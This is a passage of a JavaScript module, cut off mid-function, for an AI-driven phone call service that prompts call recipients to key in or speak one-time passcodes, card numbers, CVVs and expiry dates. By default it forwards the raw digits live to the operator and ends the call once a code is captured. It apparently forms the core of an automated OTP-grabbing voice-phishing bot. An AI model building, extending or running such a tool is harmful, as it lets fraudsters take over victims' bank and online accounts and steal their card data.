'use strict';

const DIGIT_WORD_MAP = {
  zero: '0',
  oh: '0',
  o: '0',
  one: '1',
  two: '2',
  three: '3',
  four: '4',
  five: '5',
  six: '6',
  seven: '7',
  eight: '8',
  nine: '9'
};

const SPOKEN_DIGIT_PATTERN = new RegExp(
  `\\b(?:${Object.keys(DIGIT_WORD_MAP).join('|')})(?:\\s+(?:${Object.keys(DIGIT_WORD_MAP).join('|')})){3,}\\b`,
  'gi'
);

function createDigitCollectionService(options = {}) {
  const {
    db,
    webhookService,
    callConfigurations,
    config,
    twilioClient,
    VoiceResponse,
    getCurrentProvider,
    speakAndEndCall,
    clearSilenceTimer,
    callEndMessages = {},
    closingMessage = 'Thank you for your time. Goodbye.',
    settings = {},
    logger = console
  } = options;

  const {
    otpLength = 6,
    otpMaxRetries = 3,
    otpDisplayMode = 'masked',
    defaultCollectDelayMs = 1200,
    fallbackToVoiceOnFailure = true,
    showRawDigitsLive = true,
    sendRawDigitsToUser = true,
    minDtmfGapMs = 200
  } = settings;

  function maskDigitsForPreview(digits = '') {
    if (showRawDigitsLive) return digits || '';
    const len = String(digits || '').length;
    if (!len) return '••';
    const masked = '•'.repeat(Math.max(2, Math.min(6, len)));
    return len > 6 ? `${masked}…` : masked;
  }

  function labelForProfile(profile = 'generic') {
    const map = {
      verification: 'OTP',
      otp: 'OTP',
      account: 'Account',
      zip: 'ZIP',
      extension: 'Ext',
      amount: 'Amount',
      survey: 'Survey',
      callback_confirm: 'Callback',
      card_number: 'Card',
      cvv: 'CVV',
      card_expiry: 'Expiry',
      menu: 'Menu',
      generic: 'Digits'
    };
    return map[String(profile || 'generic').toLowerCase()] || profile || 'Digits';
  }

  function estimateSpeechDurationMs(text = '') {
    const words = String(text || '')
      .trim()
      .split(/\s+/)
      .filter(Boolean).length;
    if (!words) return 0;
    const wordsPerMinute = 150;
    return Math.ceil((words / wordsPerMinute) * 60000);
  }

  function buildExpectedLabel(expectation = {}) {
    const min = expectation.min_digits || 1;
    const max = expectation.max_digits || min;
    const digitLabel = min === max ? `${min}-digit` : `${min}-${max} digit`;
    const profile = String(expectation.profile || 'generic').toLowerCase();
    switch (profile) {
      case 'menu':
        return 'menu option';
      case 'extension':
        return 'extension';
      case 'zip':
        return 'ZIP code';
      case 'account':
        return 'account number';
      case 'cvv':
        return 'security code';
      case 'card_number':
        return 'card number';
      case 'card_expiry':
        return 'expiry date';
      case 'amount':
        return 'amount';
      case 'survey':
        return 'rating';
      case 'callback_confirm':
        return 'phone number';
      case 'verification':
      case 'otp':
        return `${digitLabel} code`;
      default:
        return `${digitLabel} code`;
    }
  }

  function buildDefaultReprompts(expectation = {}) {
    const label = buildExpectedLabel(expectation);
    const profile = String(expectation.profile || 'generic').toLowerCase();
    if (profile === 'menu') {
      return {
        invalid: [
          'That option was not valid. Please press a valid menu option now.',
          'Please press a valid menu option now.',
          'Last try: press a valid menu option now.'
        ],
        timeout: [
          'I did not receive a selection. Please press a menu option now.',
          'Please press a menu option now.',
          'Last try: press a menu option now.'
        ],
        failure: 'No valid selection was received. Thank you. Goodbye.',
        timeout_failure: 'No selection was received. Thank you. Goodbye.'
      };
    }
    return {
      invalid: [
        `That did not match. Please enter the ${label} now.`,
        `Please enter the ${label} now.`,
        `Last try: enter the ${label} now.`
      ],
      timeout: [
        `I did not receive any input. Please enter the ${label} now.`,
        `Please enter the ${label} now.`,
        `Last try: enter the ${label} now.`
      ],
      failure: `We could not verify the ${label}. Thank you for your time. Goodbye.`,
      timeout_failure: `No input received for the ${label}. Thank you for your time. Goodbye.`
    };
  }

  function normalizeRepromptValue(value) {
    if (Array.isArray(value)) {
      const trimmed = value.map((item) => String(item || '').trim()).filter(Boolean);
      return trimmed.length ? trimmed : '';
    }
    if (typeof value === 'string') {
      const trimmed = value.trim();
      return trimmed || '';
    }
    return '';
  }

  function chooseReprompt(expectation = {}, kind = 'invalid', attempt = 1) {
    const key = kind === 'timeout'
      ? expectation.reprompt_timeout
      : kind === 'incomplete'
        ? expectation.reprompt_incomplete
        : expectation.reprompt_invalid;
    if (Array.isArray(key) && key.length) {
      const idx = Math.max(0, Math.min(key.length - 1, (attempt || 1) - 1));
      return key[idx];
    }
    if (typeof key === 'string' && key.trim()) return key.trim();
    return '';
  }

  const OTP_REGEX = /\b\d{4,8}\b/g;

  const digitTimeouts = new Map();
  const digitFallbackStates = new Map();
  const digitCollectionPlans = new Map();
  const lastDtmfTimestamps = new Map();

  const DIGIT_PROFILE_DEFAULTS = {
    verification: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: false },
    otp: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: false },
    cvv: { min_digits: 3, max_digits: 4, timeout_s: 12, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    card_number: { min_digits: 13, max_digits: 19, timeout_s: 25, max_retries: 2, min_collect_delay_ms: 1500, confirmation_style: 'last4', end_call_on_success: false },
    card_expiry: { min_digits: 4, max_digits: 6, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    zip: { min_digits: 5, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    extension: { min_digits: 1, max_digits: 6, timeout_s: 10, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false },
    menu: { min_digits: 1, max_digits: 1, timeout_s: 8, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false }
  };

  function getDigitProfileDefaults(profile = 'generic') {
    const key = String(profile || 'generic').toLowerCase();
    return DIGIT_PROFILE_DEFAULTS[key] || {};
  }

  function normalizeDigitExpectation(params = {}) {
    const promptHint = `${params.prompt || ''} ${params.prompt_hint || ''}`.toLowerCase();
    let profile = String(params.profile || 'generic').toLowerCase();
    if (profile === 'generic' && promptHint.match(/\b(code|otp|verification|verify|passcode|pin)\b/)) {
      profile = 'verification';
    } else if (profile === 'generic' && promptHint.match(/\b(press|option|menu)\b/)) {
      profile = 'menu';
    } else if (profile === 'generic' && promptHint.match(/\b(rate|rating|survey|feedback)\b/)) {
      profile = 'survey';
    }
    const defaults = getDigitProfileDefaults(profile);
    const minDigits = typeof params.min_digits === 'number'
      ? params.min_digits
      : (typeof defaults.min_digits === 'number' ? defaults.min_digits : 1);
    const maxDigits = typeof params.max_digits === 'number'
      ? params.max_digits
      : (typeof defaults.max_digits === 'number' ? defaults.max_digits : minDigits);
    const timeout = typeof params.timeout_s === 'number'
      ? params.timeout_s
      : (typeof defaults.timeout_s === 'number' ? defaults.timeout_s : 20);
    const maxRetries = typeof params.max_retries === 'number'
      ? params.max_retries
      : (typeof defaults.max_retries === 'number' ? defaults.max_retries : 2);
    const minCollectDelayMs = typeof params.min_collect_delay_ms === 'number'
      ? params.min_collect_delay_ms
      : (typeof defaults.min_collect_delay_ms === 'number' ? defaults.min_collect_delay_ms : defaultCollectDelayMs);
    const maskForGpt = typeof params.mask_for_gpt === 'boolean'
      ? params.mask_for_gpt
      : (typeof defaults.mask_for_gpt === 'boolean' ? defaults.mask_for_gpt : true);
    const speakConfirmation = typeof params.speak_confirmation === 'boolean' ? params.speak_confirmation : false;
    const confirmationStyle = params.confirmation_style || defaults.confirmation_style || 'none';
    const endCallOnSuccess = typeof params.end_call_on_success === 'boolean'
      ? params.end_call_on_success
      : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : false);
    const prompt = params.prompt && String(params.prompt).trim().length > 0
      ? params.prompt
      : '';
    const reprompt_message = params.reprompt_message || defaults.reprompt_message || '';
    const terminatorChar = params.terminator_char || defaults.terminator_char || '#';
    const allowTerminator = params.allow_terminator === true || defaults.allow_terminator === true;
    const terminatorSuffix = allowTerminator
      ? ` You can end with ${terminatorChar} when finished.`
      : '';

    let normalizedMin = minDigits;
    let normalizedMax = maxDigits < minDigits ? minDigits : maxDigits;
    if (profile === 'verification' && params.force_exact_length) {
      normalizedMin = params.force_exact_length;
      normalizedMax = params.force_exact_length;
    }
    if (allowTerminator && terminatorChar === '#') {
      normalizedMax = Math.max(normalizedMax, normalizedMin);
    }
    if (profile === 'verification' || profile === 'otp') {
      if (normalizedMin < 4) normalizedMin = 4;
      if (normalizedMax < normalizedMin) normalizedMax = normalizedMin;
      if (normalizedMax > 8) normalizedMax = 8;
    }

    const repromptDefaults = buildDefaultReprompts({
      profile,
      min_digits: normalizedMin,
      max_digits: normalizedMax,
      allow_terminator: allowTerminator,
      terminator_char: terminatorChar
    });

    const reprompt_invalid = normalizeRepromptValue(
      params.reprompt_invalid ?? defaults.reprompt_invalid ?? repromptDefaults.invalid
    );
    const reprompt_incomplete = normalizeRepromptValue(
      params.reprompt_incomplete ?? defaults.reprompt_incomplete ?? repromptDefaults.invalid
    );
    const reprompt_timeout = normalizeRepromptValue(
      params.reprompt_timeout ?? defaults.reprompt_timeout ?? repromptDefaults.timeout
    );
    const failure_message = normalizeRepromptValue(
      params.failure_message ?? defaults.failure_message ?? repromptDefaults.failure
    );
    const timeout_failure_message = normalizeRepromptValue(
      params.timeout_failure_message ?? defaults.timeout_failure_message ?? repromptDefaults.timeout_failure
    );

    const estimatedPromptMs = estimateSpeechDurationMs(params.prompt_hint || '');
    const adjustedDelayMs = Math.max(minCollectDelayMs, estimatedPromptMs, 3000);

    return {
      prompt: `${prompt}${terminatorSuffix}`,
      reprompt_message,
      reprompt_invalid,
      reprompt_incomplete,
      reprompt_timeout,
      failure_message,
      timeout_failure_message,
      profile,
      min_digits: normalizedMin,
      max_digits: normalizedMax,
      timeout_s: timeout,
      max_retries: maxRetries,
      min_collect_delay_ms: adjustedDelayMs,
      menu_options: params.menu_options || [],
      confirmation_style: confirmationStyle,
      allow_spoken_fallback: params.allow_spoken_fallback !== false,
      mask_for_gpt: maskForGpt,
      speak_confirmation: speakConfirmation,
      end_call_on_success: endCallOnSuccess,
      allow_terminator: allowTerminator,
      terminator_char: terminatorChar
    };
  }

  function buildDigitPrompt(expectation) {
    const min = expectation?.min_digits || 1;
    const max = expectation?.max_digits || min;
    const label = min === max ? `${min}-digit` : `${min}-${max} digit`;
    return `Please enter the ${label} code using your keypad.`;
  }

  function clearDigitTimeout(callSid) {
    const timer = digitTimeouts.get(callSid);
    if (timer) {
      clearTimeout(timer);
      digitTimeouts.delete(callSid);
    }
  }

  function clearDigitFallbackState(callSid) {
    if (digitFallbackStates.has(callSid)) {
      digitFallbackStates.delete(callSid);
    }
  }

  function clearDigitPlan(callSid) {
    if (digitCollectionPlans.has(callSid)) {
      digitCollectionPlans.delete(callSid);
    }
  }

  function markDigitPrompted(callSid) {
    const expectation = digitCollectionManager.expectations.get(callSid);
    if (!expectation) return;
    expectation.prompted_at = Date.now();
    digitCollectionManager.expectations.set(callSid, expectation);
  }

  function isValidLuhn(value = '') {
    const digits = String(value || '').replace(/\D/g, '');
    if (!digits) return false;
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i -= 1) {
      let digit = Number(digits[i]);
      if (Number.isNaN(digit)) return false;
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function validateProfileDigits(profile = 'generic', digits = '') {
    const value = String(digits || '');
    if (!value) {
      return { valid: false, reason: 'empty' };
    }

    switch (String(profile || '').toLowerCase()) {
      case 'verification':
        if (value.length === otpLength) {
          return { valid: true };
        }
        return { valid: false, reason: 'invalid_length' };
      case 'cvv':
        if (value.length === 3 || value.length === 4) {
          return { valid: true };
        }
        return { valid: false, reason: 'invalid_cvv' };
      case 'card_number':
        if (value.length < 13 || value.length > 19) {
          return { valid: false, reason: 'invalid_card_length' };
        }
        return isValidLuhn(value)
          ? { valid: true }
          : { valid: false, reason: 'invalid_card_number' };
      case 'card_expiry': {
        if (value.length !== 4 && value.length !== 6) {
          return { valid: false, reason: 'invalid_expiry_length' };
        }
        const month = Number(value.slice(0, 2));
        if (!month || month < 1 || month > 12) {
          return { valid: false, reason: 'invalid_expiry_month' };
        }
        return { valid: true };
      }
      default:
        return { valid: true };
    }
  }

  const digitCollectionManager = {
    expectations: new Map(),
    setExpectation(callSid, params = {}) {
      const normalized = normalizeDigitExpectation(params);
      this.expectations.set(callSid, {
        ...normalized,
        plan_id: params.plan_id || null,
        plan_step_index: Number.isFinite(params.plan_step_index) ? params.plan_step_index : null,
        plan_total_steps: Number.isFinite(params.plan_total_steps) ? params.plan_total_steps : null,
        prompted_at: params.prompted_at || null,
        retries: 0,
        buffer: '',
        collected: [],
        last_masked: null
      });
    },
    recordDigits(callSid, digits = '', meta = {}) {
      if (!digits) return { accepted: false, reason: 'empty' };
      const exp = this.expectations.get(callSid);
      if (!exp) return { accepted: false, reason: 'no_expectation' };
      const result = { profile: exp.profile, mask_for_gpt: exp.mask_for_gpt };
      const hasTerminator = exp.allow_terminator && digits.includes(exp.terminator_char || '#');
      const cleanDigits = digits.replace(/[^0-9]/g, '');
      const isRepeating = (val) => val.length >= 6 && /^([0-9])\1+$/.test(val);
      const isAscending = (val) => val.length >= 6 && '0123456789'.includes(val);

      if (meta.timestamp && exp.profile !== 'menu') {
        const lastTs = lastDtmfTimestamps.get(callSid) || 0;
        const gap = lastTs ? meta.timestamp - lastTs : null;
        if (gap !== null && gap < minDtmfGapMs && cleanDigits.length === 1) {
          result.accepted = false;
          result.reason = 'too_fast';
          result.heuristic = 'inter_key_gap';
          exp.buffer = '';
          this.expectations.set(callSid, exp);
          lastDtmfTimestamps.set(callSid, meta.timestamp);
          return result;
        }
        lastDtmfTimestamps.set(callSid, meta.timestamp);
      }

      if (exp.profile === 'menu' && exp.menu_options.length) {
        const hit = exp.menu_options.find((o) => String(o.digit) === String(cleanDigits || digits));
        if (hit) {
          result.digits = String(cleanDigits || digits);
          result.len = result.digits.length;
          result.masked = result.digits;
          result.route = hit.route || hit.label || `menu_${digits}`;
          result.accepted = true;
        } else {
          result.accepted = false;
          result.reason = 'invalid_menu_option';
        }
        exp.collected.push(result.digits || digits);
        exp.last_masked = result.masked || result.digits;
        this.expectations.set(callSid, exp);
        return result;
      }

      exp.buffer = `${exp.buffer || ''}${String(cleanDigits)}`;
      const currentBuffer = exp.buffer;
      const len = currentBuffer.length;
      const inRange = len >= exp.min_digits && len <= exp.max_digits;
      const tooLong = len > exp.max_digits;
      const masked = len <= 4 ? currentBuffer : `${'*'.repeat(Math.max(0, len - 4))}${currentBuffer.slice(-4)}`;

      let accepted = inRange && !tooLong;
      let reason = null;

      if (hasTerminator) {
        if (len < exp.min_digits) {
          accepted = false;
          reason = 'too_short';
        } else if (len > exp.max_digits) {
          accepted = false;
          reason = 'too_long';
        } else {
          accepted = true;
        }
      }

      if (tooLong) {
        accepted = false;
        reason = 'too_long';
        exp.buffer = '';
      } else if (!inRange) {
        accepted = false;
        reason = 'incomplete';
      } else {
        const validation = validateProfileDigits(exp.profile, currentBuffer);
        if (!validation.valid) {
          accepted = false;
          reason = validation.reason || 'invalid';
          exp.buffer = '';
        }
      }

      Object.assign(result, {
        digits: currentBuffer,
        len,
        masked,
        accepted,
        reason
      });

      exp.collected.push(result.digits);
      exp.last_masked = masked;

      if (result.accepted) {
        if (isRepeating(currentBuffer) || isAscending(currentBuffer)) {
          result.accepted = false;
          result.reason = 'spam_pattern';
          result.heuristic = isRepeating(currentBuffer) ? 'repeat_pattern' : 'ascending_pattern';
          exp.buffer = '';
          exp.retries += 1;
          result.retries = exp.retries;
          this.expectations.set(callSid, exp);
          return result;
        }
        exp.buffer = '';
        if (hasTerminator) {
          exp.terminated = true;
        }
      } else if (result.reason && result.reason !== 'incomplete') {
        exp.retries += 1;
        result.retries = exp.retries;
        if (exp.retries > exp.max_retries) {
          result.fallback = true;
        }
      }

      this.expectations.set(callSid, exp);
      return result;
    }
  };

  async function scheduleDigitTimeout(callSid, gptService = null, interactionCount = 0) {
    const exp = digitCollectionManager.expectations.get(callSid);
    if (!exp || !exp.timeout_s) return;

    clearDigitTimeout(callSid);

    const timeoutMs = Math.max(5000, (exp.timeout_s || 10) * 1000);
    const delayMs = Math.max(3000, exp.min_collect_delay_ms || 0);
    const waitMs = delayMs + timeoutMs;

    const timer = setTimeout(async () => {
      const current = digitCollectionManager.expectations.get(callSid);
      if (!current) return;

      try {
        await db.addCallDigitEvent({
          call_sid: callSid,
          source: 'timeout',
          profile: current.profile || 'generic',
          digits: null,
          len: 0,
          accepted: false,
          reason: 'timeout',
          metadata: {
            attempt: (current.retries || 0) + 1,
            max_retries: current.max_retries
          }
        });
      } catch (err) {
        logger.error('Error logging digit timeout:', err);
      }

      if (!digitFallbackStates.get(callSid)?.active && typeof triggerTwilioGatherFallback === 'function') {
        try {
          const usedFallback = await triggerTwilioGatherFallback(callSid, current, {
            prompt: buildDigitPrompt(current)
          });
          if (usedFallback) {
            return;
          }
        } catch (err) {
          logger.error('Twilio gather fallback error:', err);
        }
      }

      current.retries = (current.retries || 0) + 1;
      digitCollectionManager.expectations.set(callSid, current);

      if (current.retries > current.max_retries) {
        digitCollectionManager.expectations.delete(callSid);
        clearDigitTimeout(callSid);
        clearDigitFallbackState(callSid);
        clearDigitPlan(callSid);
        const finalTimeoutMessage = current.timeout_failure_message || callEndMessages.no_response;
        await speakAndEndCall(callSid, finalTimeoutMessage, 'digit_collection_timeout');
        return;
      }

      const prompt = chooseReprompt(current, 'timeout', current.retries)
        || `I did not catch that. Please re-enter the ${buildExpectedLabel(current)} now.`;

      const personalityInfo = gptService?.personalityEngine?.getCurrentPersonality();
      const reply = {
        partialResponseIndex: null,
        partialResponse: prompt,
        personalityInfo,
        adaptationHistory: gptService?.personalityChanges?.slice(-3) || []
      };

      if (gptService) {
        gptService.emit('gptreply', reply, interactionCount);
        try {
          gptService.updateUserContext('digit_timeout', 'system', `Digit timeout retry ${current.retries}/${current.max_retries}`);
        } catch (_) {}
      }

      webhookService.addLiveEvent(callSid, `⏳ Awaiting digits retry ${current.retries}/${current.max_retries}`, { force: true });

      scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
    }, waitMs);

    digitTimeouts.set(callSid, timer);
  }

  function buildTwilioGatherTwiml(callSid, expectation, options = {}, hostname) {
    if (!VoiceResponse) {
      throw new Error('VoiceResponse not configured for Twilio gather');
    }
    const response = new VoiceResponse();
    const min = expectation?.min_digits || 1;
    const max = expectation?.max_digits || min;
    const host = hostname || config?.server?.hostname;
    const actionUrl = `https://${host}/webhook/twilio-gather?callSid=${encodeURIComponent(callSid)}`;
    const gather = response.gather({
      input: 'dtmf',
      numDigits: max,
      timeout: Math.max(3, expectation?.timeout_s || 10),
      action: actionUrl,
      method: 'POST'
    });
    const prompt = options.prompt || buildDigitPrompt(expectation);
    gather.say(prompt);
    if (options.followup) {
      response.say(options.followup);
    }
    return response.toString();
  }

  async function triggerTwilioGatherFallback(callSid, expectation, options = {}) {
    const provider = typeof getCurrentProvider === 'function' ? getCurrentProvider() : config?.platform?.provider;
    if (provider && provider !== 'twilio') return false;
    if (!config?.twilio?.gatherFallback) return false;
    if (!config?.server?.hostname) return false;

    const state = digitFallbackStates.get(callSid);
    if (state?.active) return false;

    const accountSid = config.twilio.accountSid;
    const authToken = config.twilio.authToken;
    if (!accountSid || !authToken || !twilioClient) {
      return false;
    }

    const client = twilioClient(accountSid, authToken);
    const twiml = buildTwilioGatherTwiml(callSid, expectation, options);
    await client.calls(callSid).update({ twiml });
    markDigitPrompted(callSid);

    digitFallbackStates.set(callSid, {
      active: true,
      attempts: (state?.attempts || 0) + 1,
      lastAt: new Date().toISOString()
    });

    webhookService.addLiveEvent(callSid, '📟 Capturing Mode', { force: true });
    return true;
  }

  function formatOtpForDisplay(digits, mode = otpDisplayMode) {
    const safeDigits = String(digits || '').replace(/\D/g, '');
    if (mode === 'length') {
      return `OTP received (${safeDigits.length} digits)`;
    }
    if (mode === 'progress') {
      return `OTP entry: ${safeDigits.length}/${otpLength} digits received`;
    }
    if (!safeDigits) return 'OTP received';
    const maskLen = Math.max(0, safeDigits.length - 2);
    const masked = `${'*'.repeat(maskLen)}${safeDigits.slice(-2)}`;
    return `OTP received: ${masked}`;
  }

  function formatDigitsGeneral(digits, masked = null, mode = 'live') {
    const raw = String(digits || '');
    if (mode === 'live' && showRawDigitsLive) return raw;
    if (mode === 'notify' && sendRawDigitsToUser) return raw;
    if (masked) return masked;
    const safe = raw.replace(/\d{0,}/g, (m) => (m.length <= 4 ? m : `${'*'.repeat(Math.max(0, m.length - 2))}${m.slice(-2)}`));
    return safe;
  }

  function extractSpokenDigitSequences(text = '') {
    if (!text) return [];
    const tokens = text
      .toLowerCase()
      .replace(/[^a-z0-9\s]/g, ' ')
      .split(/\s+/)
      .filter(Boolean);

    const sequences = [];
    let buffer = '';
    let repeat = 1;

    for (const token of tokens) {
      if (token === 'double') {
        repeat = 2;
        continue;
      }
      if (token === 'triple') {
        repeat = 3;
        continue;
      }

      const digit = DIGIT_WORD_MAP[token];
      if (digit) {
        buffer += digit.repeat(repeat);
        repeat = 1;
        continue;
      }

      if (/^\d+$/.test(token)) {
        if (buffer) {
          sequences.push(buffer);
          buffer = '';
        }
        sequences.push(token);
        repeat = 1;
        continue;
      }

      if (buffer) {
        sequences.push(buffer);
        buffer = '';
      }
      repeat = 1;
    }

    if (buffer) {
      sequences.push(buffer);
    }

    return sequences;
  }

  function getOtpContext(text = '', callSid = null) {
    if (!text) {
      return {
        raw: text,
        maskedForGpt: text,
        maskedForLogs: text,
        otpDetected: false,
        codes: []
      };
    }
    const expectation = callSid ? digitCollectionManager.expectations.get(callSid) : null;
    const maskForGpt = expectation ? expectation.mask_for_gpt !== false : true;
    const minExpected = typeof expectation?.min_digits === 'number' ? expectation.min_digits : 4;
    const maxExpected = typeof expectation?.max_digits === 'number' ? expectation.max_digits : 8;
    const dynamicRegex = expectation
      ? new RegExp(`\\b\\d{${minExpected},${maxExpected}}\\b`, 'g')
      : OTP_REGEX;
    const numericCodes = [...text.matchAll(dynamicRegex)].map((m) => m[0]);
    const spokenCodes = extractSpokenDigitSequences(text).filter((code) => code.length >= minExpected && code.length <= maxExpected);
    const codes = [...numericCodes, ...spokenCodes];
    const otpDetected = codes.length > 0;
    const masked = text.replace(dynamicRegex, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
    return {
      raw: text,
      maskedForGpt: maskForGpt ? masked : text,
      maskedForLogs: masked,
      otpDetected,
      codes
    };
  }

  function maskOtpForExternal(text = '') {
    if (!text) return text;
    return text.replace(OTP_REGEX, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
  }

  function buildExpectationFromConfig(callConfig = {}) {
    const profile = String(callConfig.collection_profile || '').trim().toLowerCase();
    if (!profile) return null;
    const defaults = getDigitProfileDefaults(profile);
    const expectedLength = Number(callConfig.collection_expected_length);
    const explicitLength = Number.isFinite(expectedLength) ? expectedLength : null;
    const minDigits = explicitLength || defaults.min_digits || 1;
    const maxDigits = explicitLength || defaults.max_digits || minDigits;
    const timeout = Number(callConfig.collection_timeout_s);
    const timeout_s = Number.isFinite(timeout) ? timeout : defaults.timeout_s;
    const retries = Number(callConfig.collection_max_retries);
    const max_retries = Number.isFinite(retries) ? retries : defaults.max_retries;
    const menu_options = Array.isArray(callConfig.collection_menu_options) ? callConfig.collection_menu_options : [];
    const mask_for_gpt = typeof callConfig.collection_mask_for_gpt === 'boolean'
      ? callConfig.collection_mask_for_gpt
      : (typeof defaults.mask_for_gpt === 'boolean' ? defaults.mask_for_gpt : true);
    const speak_confirmation = typeof callConfig.collection_speak_confirmation === 'boolean'
      ? callConfig.collection_speak_confirmation
      : false;
    const prompt = ''; // initial prompt now comes from bot payload, not profile
    const end_call_on_success = (profile === 'verification' || profile === 'otp')
      ? true
      : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : false);
    return {
      profile,
      min_digits: minDigits,
      max_digits: maxDigits,
      timeout_s,
      max_retries,
      menu_options,
      mask_for_gpt,
      speak_confirmation,
      prompt,
      end_call_on_success
    };
  }

  function inferDigitExpectationFromText(text = '', callConfig = {}) {
    const lower = String(text || '').toLowerCase();
    const hasDigitWord = /\b(code|otp|pin|verification|passcode|password|one[-\s]?time)\b/.test(lower);
    const hasPress = /\bpress\b/.test(lower);
    const hasOption = /\b(option|menu)\b/.test(lower);
    const sixMention = /\b6\b.*\bdigit/.test(lower) || /\bsix digit/.test(lower);
    const fourDigit = /\b4\b.*\bdigit/.test(lower) || /\bfour digit/.test(lower);
    const acctMention = /\b(account|policy|member|customer|reference|confirmation|tracking|case)\b/.test(lower);
    const pinMention = /\b(pin|passcode)\b/.test(lower);
    const numberHint = (match) => {
      const m = lower.match(match);
      return m ? parseInt(m[1], 10) : null;
    };
    const digitLen = numberHint(/\b(\d{4,8})\b/);
    const tpl = callConfig.template_policy || {};

    if (tpl.requires_otp) {
      const len = tpl.expected_length || otpLength;
      return {
        profile: tpl.default_profile || 'verification',
        min_digits: len,
        max_digits: len,
        force_exact_length: len,
        prompt: '',
        end_call_on_success: true,
        max_retries: otpMaxRetries,
        confidence: 0.95,
        reason: 'template_requires_otp',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    if (tpl.default_profile && tpl.default_profile !== 'generic') {
      const len = tpl.expected_length || (tpl.default_profile === 'menu' ? 1 : otpLength);
      return {
        profile: tpl.default_profile,
        min_digits: len,
        max_digits: len,
        force_exact_length: tpl.default_profile === 'menu' ? undefined : len,
        prompt: '',
        end_call_on_success: tpl.default_profile === 'verification',
        max_retries: otpMaxRetries,
        confidence: 0.8,
        reason: 'template_default_profile',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    if (hasDigitWord || sixMention || pinMention) {
      return {
        profile: 'verification',
        min_digits: sixMention ? 6 : (digitLen || otpLength),
        max_digits: sixMention ? 6 : (digitLen || otpLength),
        force_exact_length: sixMention ? 6 : undefined,
        prompt: '',
        end_call_on_success: true,
        max_retries: otpMaxRetries,
        confidence: 0.75,
        reason: 'otp_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    if (hasPress || hasOption) {
      return {
        profile: 'menu',
        min_digits: 1,
        max_digits: 1,
        prompt: '',
        end_call_on_success: false,
        max_retries: 2,
        confidence: 0.65,
        reason: 'menu_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    if (acctMention || digitLen) {
      const len = digitLen || (fourDigit ? 4 : 8);
      return {
        profile: 'account',
        min_digits: Math.min(6, len),
        max_digits: Math.max(len, 10),
        confirmation_style: 'last4',
        speak_confirmation: false,
        prompt: '',
        end_call_on_success: false,
        max_retries: 2,
        confidence: 0.6,
        reason: 'account_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    return null;
  }

  function determineDigitIntent(callConfig = {}) {
    const explicit = buildExpectationFromConfig(callConfig);
    if (explicit) {
      return {
        mode: 'dtmf',
        reason: 'explicit_config',
        confidence: 0.95,
        expectation: explicit
      };
    }

    const text = `${callConfig.prompt || ''} ${callConfig.first_message || ''}`.trim();
    if (!text) {
      return { mode: 'normal', reason: 'no_prompt', confidence: 0 };
    }

    const inferred = inferDigitExpectationFromText(text, callConfig);
    if (inferred) {
      return {
        mode: 'dtmf',
        reason: inferred.reason || 'prompt_signal',
        confidence: inferred.confidence || 0.6,
        expectation: inferred
      };
    }

    return { mode: 'normal', reason: 'no_signal', confidence: 0 };
  }

  async function recordFirstTurnDecision(callSid, decision) {
    if (!db) return;
    if (!decision) {
      db.updateCallState(callSid, 'first_turn_decision', {
        decided: false,
        confidence: 0,
        reason: 'no_signal'
      }).catch(() => {});
      return;
    }
    db.updateCallState(callSid, 'first_turn_decision', {
      decided: true,
      profile: decision.profile,
      min_digits: decision.min_digits,
      max_digits: decision.max_digits,
      confidence: decision.confidence || 0.6,
      reason: decision.reason || 'rule_match'
    }).catch(() => {});
  }

  function prepareInitialExpectation(callSid, callConfig = {}) {
    const intent = determineDigitIntent(callConfig);
    if (intent.mode !== 'dtmf' || !intent.expectation) {
      return { intent, expectation: null };
    }
    const payload = normalizeDigitExpectation({
      ...intent.expectation,
      prompt: '',
      prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
    });
    payload.reason = intent.reason || 'initial_intent';
    digitCollectionManager.setExpectation(callSid, payload);
    return { intent, expectation: payload };
  }

  async function maybeStartFirstTurnCollection(callSid, callConfig, gptService, interactionCount, rawText) {
    if (!callConfig || callConfig.first_turn_decided) {
      return null;
    }
    if (interactionCount !== 1) {
      return null;
    }
    const decision = inferDigitExpectationFromText(rawText, callConfig);
    callConfig.first_turn_decided = true;
    callConfigurations.set(callSid, callConfig);
    if (!decision) {
      await recordFirstTurnDecision(callSid, null);
      return null;
    }
    const payload = normalizeDigitExpectation({
      ...decision,
      prompt: '',
      prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
    });
    payload.reason = decision.reason || 'first_turn';
    digitCollectionManager.setExpectation(callSid, payload);
    if (typeof clearSilenceTimer === 'function') {
      clearSilenceTimer(callSid);
    }
    if (gptService) {
      scheduleDigitTimeout(callSid, gptService, interactionCount);
    }
    const instruction = callConfig.first_message || callConfig.prompt || (payload.min_digits === payload.max_digits
      ? `Please enter the ${payload.min_digits} digit code on your keypad now.`
      : `Please enter between ${payload.min_digits} and ${payload.max_digits} digits on your keypad now.`);
    webhookService.addLiveEvent(callSid, `🔢 First-turn digit collection started (${payload.profile})`, { force: true });
    if (gptService) {
      gptService.emit('gptreply', {
